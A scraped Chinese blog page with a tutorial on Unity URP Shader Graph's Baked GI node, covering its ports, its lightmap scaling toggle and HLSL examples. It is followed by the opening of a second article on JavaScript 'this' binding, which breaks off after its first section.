                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fchenghai37%2Fcategory_13074589.html%3Ffromshare%3Dblogcolumn%26sharetype%3Dblogcolumn%26sharerId%3D13074589%26sharerefer%3DPC%26sharesource%3Dchenghai37%26sharefrom%3Dfrom_link" target="_blank" title="https://blog.csdn.net/chenghai37/category_13074589.html?fromshare=blogcolumn&amp;sharetype=blogcolumn&amp;sharerId=13074589&amp;sharerefer=PC&amp;sharesource=chenghai37&amp;sharefrom=from_link" ref="nofollow noopener noreferrer">【Unity Shader Graph 使用与特效实现】</a><strong>专栏-直达</strong></p>
</blockquote>
<p>Baked GI 节点是 Unity URP Shader Graph 中一个重要的光照计算节点，它允许着色器访问预计算的光照信息，为场景中的静态物体提供高质量的间接光照效果。在实时渲染中，全局光照（Global Illumination）的计算通常非常耗费性能，因此 Unity 提供了烘焙光照的解决方案，将复杂的光照计算预先处理并存储在光照贴图或光照探针中，运行时直接采样这些预计算数据，既能保证视觉效果又能保持高性能。</p>
<p>该节点的核心功能是根据物体的位置和朝向，从预先烘焙的光照数据中获取相应的光照颜色值。这些数据可以来自两种主要来源：光照贴图用于静态几何体，以及光照探针用于动态物体或需要动态光照的静态物体。通过合理使用 Baked GI 节点，开发者可以创建出具有丰富间接光照和真实感光照交互的着色器，而无需承担实时全局光照计算的性能开销。</p>
<p>在 URP 管线中，Baked GI 节点的实现经过了优化，专门针对移动平台和性能敏感的场景。与内置渲染管线或 HDRP 相比，URP 中的 Baked GI 节点可能有一些特定的限制和行为差异，但这些差异主要是为了确保在目标平台上的最佳性能表现。理解这些差异对于创建跨管线兼容的着色器至关重要。</p>
<h2 data-id="heading-0">描述</h2>
<p>Baked GI 节点为着色器提供了访问烘焙全局光照值的能力，这些值可以在顶点着色器或片元着色器阶段使用。节点需要几个关键的输入参数来确定如何采样光照数据，包括世界空间中的位置和法线向量，以及用于光照贴图采样的 UV 坐标。</p>
<h3 data-id="heading-1">烘焙全局光照基础</h3>
<p>烘焙全局光照是 Unity 光照系统的重要组成部分，它通过预计算场景中光线如何在不同表面之间反射和传播，生成静态的光照信息。这个过程包括直接光照和间接光照的计算，但只针对标记为静态的物体进行。烘焙完成后，光照信息会被存储到光照贴图或光照探针中：</p>
<ul>
<li>光照贴图是应用于静态几何体的纹理，包含预先计算的光照信息</li>
<li>光照探针是在场景空间中放置的采样点，存储了该位置的光照信息，可用于动态物体或需要动态光照的静态物体</li>
</ul>
<p>Baked GI 节点的作用就是在着色器执行时，根据提供的输入参数，从这些预计算的光照数据中获取相应的颜色值。</p>
<h3 data-id="heading-2">位置和法线输入的重要性</h3>
<p>位置和法线输入对于正确采样光照探针数据至关重要。光照探针数据是基于球谐函数编码的，这种编码方式能够高效地存储全方向的光照信息。当着色器需要获取某点的光照信息时，系统会根据该点的位置找到最近的光照探针组，然后使用法线方向来评估球谐函数，得到该方向上的光照颜色。</p>
<p>如果提供的位置或法线不正确，可能会导致光照采样错误，表现为不自然的光照过渡或错误的光照方向。因此，确保这些输入参数的准确性是使用 Baked GI 节点的关键。</p>
<h3 data-id="heading-3">光照贴图坐标的作用</h3>
<p>Static UV 和 Dynamic UV 输入用于采样不同类型的光照贴图：</p>
<ul>
<li>Static UV 通常对应网格的 UV1 通道，用于采样静态光照贴图</li>
<li>Dynamic UV 通常对应网格的 UV2 通道，用于采样动态全局光照的光照贴图</li>
</ul>
<p>在 Unity 的光照设置中，开发者可以选择使用不同的光照模式，如 Baked、Mixed 或 Realtime。对于 Mixed 光照模式的静态物体，Unity 会生成两套光照贴图：一套用于完全烘焙的光照，另一套用于与实时光照结合的效果。Baked GI 节点通过不同的 UV 输入来访问这些不同的光照贴图。</p>
<h3 data-id="heading-4">节点行为的管线依赖性</h3>
<p>一个重要的注意事项是，Baked GI 节点的具体行为并未在全局范围内统一定义。Shader Graph 本身并不定义这个节点的功能实现，而是由每个渲染管线决定为此节点生成什么样的 HLSL 代码。这意味着：</p>
<ul>
<li>在高清渲染管线中，Baked GI 节点可能有特定的优化和功能</li>
<li>在通用渲染管线中，节点的实现可能更注重性能和跨平台兼容性</li>
<li>在内置渲染管线中，节点的行为可能又有所不同</li>
</ul>
<p>这种设计使得每个渲染管线可以根据自身的架构和需求，优化 Baked GI 节点的实现方式。对于着色器开发者来说，这意味着如果计划创建在多种渲染管线中使用的着色器，需要在每个目标管线中测试 Baked GI 节点的行为，确保它按预期工作。</p>
<h3 data-id="heading-5">无光照着色器中的限制</h3>
<p>在 URP 和 HDRP 中，Baked GI 节点不能在无光照着色器中使用。无光照着色器通常用于不需要复杂光照计算的物体，如UI元素、粒子效果或特殊效果。这些着色器通常会绕过管线的标准光照流程，因此无法访问烘焙全局光照数据。</p>
<p>如果尝试在无光照着色器中使用 Baked GI 节点，可能会遇到编译错误或运行时错误。对于需要简单光照的无光照物体，考虑使用其他光照技术，如顶点光照或简单的漫反射计算。</p>
<h2 data-id="heading-6">端口</h2>
<p><img src="https://docs.unity.cn/cn/Packages-cn/com.unity.shadergraph@14.0/manual/images/BakedGINodeThumb.png" alt="" loading="lazy"/></p>
<p>Baked GI 节点包含多个输入端口和一个输出端口，每个端口都有特定的功能和数据要求。理解这些端口的作用对于正确使用节点至关重要。</p>
<h3 data-id="heading-7">Position 输入端口</h3>
<p>Position 输入端口接收世界空间中的位置坐标，用于确定光照采样的空间位置。这个位置信息主要用于：</p>
<ul>
<li>光照探针采样：确定使用哪些光照探针的数据</li>
<li>光照贴图索引：在某些情况下，帮助确定使用哪张光照贴图</li>
</ul>
<p>在大多数情况下，应该将物体的世界空间位置连接到这个端口。在顶点着色器阶段使用 Baked GI 节点时，可以使用 Position 节点获取顶点在世界空间中的位置；在片元着色器阶段使用时，可以使用屏幕位置或通过其他方式计算得到的世界位置。</p>
<p>当使用光照探针时，位置输入的准确性尤为重要。如果位置偏差过大，可能会导致物体采样到错误位置的光照探针数据，造成光照不匹配的现象。</p>
<h3 data-id="heading-8">Normal 输入端口</h3>
<p>Normal 输入端口接收世界空间中的法线向量，用于确定表面朝向，从而影响光照采样的方向。法线输入的主要作用包括：</p>
<ul>
<li>光照探针评估：球谐光照基于法线方向评估光照颜色</li>
<li>光照贴图采样：在某些高级用法中，法线可能影响光照贴图的采样方式</li>
</ul>
<p>法线向量应当是世界空间中的单位向量。如果提供的法线没有归一化，可能会导致光照计算错误。通常情况下，可以使用 Transform 节点将物体空间法线转换到世界空间，并确保使用正确的变换矩阵（通常是转置逆矩阵）。</p>
<p>对于动态法线效果（如法线贴图），需要将修改后的法线向量连接到 Normal 端口，这样 Baked GI 节点就会基于修改后的表面朝向计算光照，创造出更加丰富的视觉效果。</p>
<h3 data-id="heading-9">Static UV 输入端口</h3>
<p>Static UV 输入端口用于指定静态光照贴图的纹理坐标。这些坐标通常对应于网格的 UV1 通道，也就是在建模软件中为光照贴图准备的 UV 集。Static UV 的作用包括：</p>
<ul>
<li>采样完全烘焙的光照贴图</li>
<li>访问静态物体的间接光照信息</li>
<li>在 Mixed 光照模式下，采样烘焙的间接光照部分</li>
</ul>
<p>当场景中使用 Baked 或 Mixed 光照模式时，Unity 会为静态物体生成光照贴图。这些光照贴图包含了预计算的直接和间接光照信息。Static UV 输入确保着色器能够正确访问这些光照数据。</p>
<p>如果网格没有正确设置光照贴图 UV，或者 Static UV 输入不正确，可能会导致光照贴图采样错误，表现为拉伸、扭曲或重复的光照图案。</p>
<h3 data-id="heading-10">Dynamic UV 输入端口</h3>
<p>Dynamic UV 输入端口用于指定动态光照贴图的纹理坐标，通常对应于网格的 UV2 通道。Dynamic UV 的主要应用场景包括：</p>
<ul>
<li>在 Mixed 光照模式下，采样用于实时光照交互的光照贴图</li>
<li>访问动态全局光照系统生成的光照信息</li>
<li>处理需要与实时光源交互的静态物体的光照</li>
</ul>
<p>在 Mixed 光照模式下，Unity 会为静态物体生成两套光照贴图：一套用于完全烘焙的光照（通过 Static UV 访问），另一套用于与实时光源结合的效果（通过 Dynamic UV 访问）。这种设计允许静态物体既受益于高质量的烘焙光照，又能与场景中的实时光源正确交互。</p>
<h3 data-id="heading-11">Out 输出端口</h3>
<p>Out 输出端口提供从烘焙全局光照系统采样的颜色值。这个输出是三维向量，表示 RGB 颜色空间中的光照颜色。输出的光照值已经考虑了：</p>
<ul>
<li>直接光照和间接光照的贡献</li>
<li>颜色反射和光能传递效果</li>
<li>场景的环境光遮蔽</li>
</ul>
<p>输出的颜色值通常需要与材质的反照率颜色相乘，以实现正确的光照着色。在基于物理的着色模型中，Baked GI 的输出代表入射光强度，应当与表面反照率相乘来计算出射光强度。</p>
<p>在某些高级用法中，Baked GI 的输出可以用于更复杂的光照计算，如与实时光照结合，或作为其他着色效果的输入。</p>
<h2 data-id="heading-12">控件</h2>
<p>Baked GI 节点提供了一个重要的控件选项，用于调整光照贴图的处理方式。</p>
<h3 data-id="heading-13">Apply Lightmap Scaling 切换</h3>
<p>Apply Lightmap Scaling 是一个布尔切换控件，决定是否对光照贴图坐标自动应用缩放和偏移。这个选项默认为启用状态，在大多数情况下应该保持启用。</p>
<p>当启用 Apply Lightmap Scaling 时，节点会自动应用 Unity 光照系统中定义的光照贴图缩放和偏移变换。这些变换确保光照贴图正确映射到网格表面，考虑到了光照贴图的分包、排列和压缩设置。</p>
<p>禁用 Apply Lightmap Scaling 的情况较为少见，通常只在以下特定场景中考虑：</p>
<ul>
<li>当手动处理光照贴图坐标时</li>
<li>当使用自定义的光照贴图布局时</li>
<li>在某些特殊效果着色器中，需要直接访问原始光照贴图坐标</li>
</ul>
<p>在大多数标准用法中，建议保持此选项启用，以确保光照贴图正确映射。如果禁用此选项，需要手动确保光照贴图坐标的正确性，否则可能导致光照贴图采样错误。</p>
<h2 data-id="heading-14">生成代码示例</h2>
<p>Baked GI 节点在生成着色器代码时，会根据所在的渲染管线产生相应的 HLSL 代码。以下示例展示了 URP 中 Baked GI 节点可能生成的代码结构。</p>
<h3 data-id="heading-15">基本函数定义</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function">HLSL

<span class="hljs-keyword">void</span> <span class="hljs-title">Unity_BakedGI_float</span>(<span class="hljs-params">float3 Position, float3 Normal, float2 StaticUV, float2 DynamicUV, <span class="hljs-keyword">out</span> float3 Out</span>)</span>
{
    Out = SHADERGRAPH_BAKED_GI(Position, Normal, StaticUV, DynamicUV, <span class="hljs-literal">false</span>);
}
</code></pre>
<p>这个函数定义展示了 Baked GI 节点的基本代码结构。函数接收位置、法线和光照贴图坐标作为输入，通过 SHADERGRAPH_BAKED_GI 宏计算烘焙全局光照值，并将结果输出到 Out 参数。</p>
<p>SHADERGRAPH_BAKED_GI 是一个由 Shader Graph 系统定义的宏，它的具体实现取决于目标渲染管线。在 URP 中，这个宏会展开为访问 URP 烘焙光照系统的代码。</p>
<h3 data-id="heading-16">实际应用示例</h3>
<p>在实际的着色器中，Baked GI 节点通常与其他光照计算结合使用。以下是一个简单的表面着色器示例，展示如何将 Baked GI 与实时直接光照结合：</p>
<pre><code class="hljs language-ini" lang="ini">HLSL

void surf(Input IN, inout SurfaceOutputStandard o)
{
    // 采样反照率贴图
    fixed4 <span class="hljs-attr">albedo</span> = tex2D(_MainTex, IN.uv_MainTex) * _Color<span class="hljs-comment">;</span>

    // 获取烘焙全局光照
    float3 bakedGI<span class="hljs-comment">;</span>
    Unity_BakedGI_float(IN.worldPos, IN.worldNormal, IN.uv1, IN.uv2, bakedGI)<span class="hljs-comment">;</span>

    // 计算实时直接光照（简化示例）
    float3 <span class="hljs-attr">directLight</span> = _LightColor0 * max(<span class="hljs-number">0</span>, dot(IN.worldNormal, _WorldSpaceLightPos0.xyz))<span class="hljs-comment">;</span>

    // 结合光照
    <span class="hljs-attr">o.Albedo</span> = albedo.rgb<span class="hljs-comment">;</span>
    <span class="hljs-attr">o.Emission</span> = bakedGI * albedo.rgb<span class="hljs-comment">;</span>
    // 直接光照已经在光照模型中处理
}
</code></pre>
<p>这个示例展示了烘焙间接光照与实时直接光照的基本结合方式。在实际的 URP 着色器中，光照计算可能更加复杂，涉及更多光照模型和渲染特性。</p>
<h3 data-id="heading-17">顶点与片元着色器中的使用</h3>
<p>Baked GI 节点既可以在顶点着色器中使用，也可以在片元着色器中使用，取决于性能和质量的需求：</p>
<p><strong>顶点着色器中使用：</strong></p>
<pre><code class="hljs language-scss" lang="scss">HLSL

v2f vert (appdata v)
{
    v2f o;
    <span class="hljs-comment">// ... 其他顶点变换</span>

    <span class="hljs-comment">// 在顶点着色器中计算烘焙GI</span>
    <span class="hljs-built_in">Unity_BakedGI_float</span>(mul(unity_ObjectToWorld, v.vertex)<span class="hljs-selector-class">.xyz</span>,
                        <span class="hljs-built_in">normalize</span>(mul(v.normal, (float3x3)unity_WorldToObject)),
                        v<span class="hljs-selector-class">.uv1</span>, v<span class="hljs-selector-class">.uv2</span>, o<span class="hljs-selector-class">.bakedGI</span>);

    return o;
}
</code></pre>
<p><strong>片元着色器中使用：</strong></p>
<pre><code class="hljs language-css" lang="css">HLSL

fixed4 frag (v2f <span class="hljs-selector-tag">i</span>) : SV_Target
{
    // 在片元着色器中计算烘焙GI（更高质量）
    float3 bakedGI;
    Unity_BakedGI_float(<span class="hljs-selector-tag">i</span><span class="hljs-selector-class">.worldPos</span>, normalize(<span class="hljs-selector-tag">i</span><span class="hljs-selector-class">.worldNormal</span>), <span class="hljs-selector-tag">i</span><span class="hljs-selector-class">.uv1</span>, <span class="hljs-selector-tag">i</span><span class="hljs-selector-class">.uv2</span>, bakedGI);

    // ... 其他着色计算
}
</code></pre>
<p>在顶点着色器中使用 Baked GI 性能更好，但光照细节较少；在片元着色器中使用质量更高，但性能开销更大。根据目标平台和性能要求选择合适的阶段。</p>
<h2 data-id="heading-18">最佳实践和性能考虑</h2>
<p>使用 Baked GI 节点时，遵循一些最佳实践可以确保最佳的性能和视觉效果。</p>
<h3 data-id="heading-19">光照贴图设置优化</h3>
<p>确保场景的光照贴图设置正确优化：</p>
<ul>
<li>使用适当的光照贴图分辨率，平衡质量和内存使用</li>
<li>合理设置光照贴图压缩，在移动平台上使用压缩格式</li>
<li>对不需要高质量光照的物体使用较低的光照贴图分辨率</li>
</ul>
<h3 data-id="heading-20">光照探针布局优化</h3>
<p>光照探针的布局影响动态物体的光照质量：</p>
<ul>
<li>在光照变化明显的区域放置更多光照探针</li>
<li>确保动态物体的移动路径上有足够的光照探针覆盖</li>
<li>使用光照探针代理卷提高大范围区域的光照探针效率</li>
</ul>
<h3 data-id="heading-21">着色器性能优化</h3>
<p>在着色器中使用 Baked GI 节点时考虑性能：</p>
<ul>
<li>在移动平台上，考虑在顶点着色器中使用 Baked GI</li>
<li>对于远处物体，使用简化的光照计算</li>
<li>避免在透明物体的着色器中过度使用复杂的光照计算</li>
</ul>
<h3 data-id="heading-22">跨管线兼容性</h3>
<p>如果计划创建跨渲染管线使用的着色器：</p>
<ul>
<li>在目标管线中测试 Baked GI 节点的行为</li>
<li>使用着色器变体或自定义函数处理管线特定的差异</li>
<li>提供回退方案，当 Baked GI 节点不可用时使用替代光照计算</li>
</ul>
<hr/>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fchenghai37%2Fcategory_13074589.html%3Ffromshare%3Dblogcolumn%26sharetype%3Dblogcolumn%26sharerId%3D13074589%26sharerefer%3DPC%26sharesource%3Dchenghai37%26sharefrom%3Dfrom_link" target="_blank" title="https://blog.csdn.net/chenghai37/category_13074589.html?fromshare=blogcolumn&amp;sharetype=blogcolumn&amp;sharerId=13074589&amp;sharerefer=PC&amp;sharesource=chenghai37&amp;sharefrom=from_link" ref="nofollow noopener noreferrer">【Unity Shader Graph 使用与特效实现】</a><strong>专栏-直达</strong>
（欢迎<em>点赞留言</em>探讨，更多人加入进来能更加完善这个探索的过程，🙏）</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从原理到实践：JavaScript中的this指向，一篇就够了]]></title>    <link>https://juejin.cn/post/7605848213602402350</link>    <guid>https://juejin.cn/post/7605848213602402350</guid>    <pubDate>2026-02-12T13:54:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605848213602402350" data-draft-id="7605782093482065946" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从原理到实践：JavaScript中的this指向，一篇就够了"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2026-02-12T13:54:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="不会敲代码1"/> <meta itemprop="url" content="https://juejin.cn/user/1927884034804425"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从原理到实践：JavaScript中的this指向，一篇就够了
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1927884034804425/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    不会敲代码1
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T13:54:14.000Z" title="Thu Feb 12 2026 13:54:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">从原理到实践：JavaScript中的this指向，一篇就够了</h2>
<h3 data-id="heading-1">前言</h3>
<p>最近在复习JavaScript的this指向问题，写了几个小例子来加深理解。很多同学觉得this难，其实是因为<strong>this是在函数执行时确定的，而不是定义时</strong>。这个特性导致了this指向的“善变”。</p>
<p>今天，就让我通过这几个代码例子，带你由浅入深掌握JavaScript中的this指向。</p>
<hr/>
<h3 data-id="heading-2">第一章：基础概念 - this的默认绑定</h3>
<h4 data-id="heading-3">1.1 全局环境下的this</h4>
<p>在浏览器全局环境中，<code>this</code>指向<code>window</code>对象：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">var</span> name = <span class="hljs-string">"windowName"</span>; <span class="hljs-comment">// 全局变量</span>
<span class="hljs-keyword">var</span> func1 = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'func1'</span>);
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// "windowName"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// "windowName"</span>
</code></pre>
<p><strong>核心知识点：</strong></p>
<ul>
<li>全局作用域下，<code>this === window</code></li>
<li>用<code>var</code>声明的全局变量会自动挂载到<code>window</code>对象上</li>
</ul>
<hr/>
<h3 data-id="heading-4">第二章：谁调用我，我就指向谁</h3>
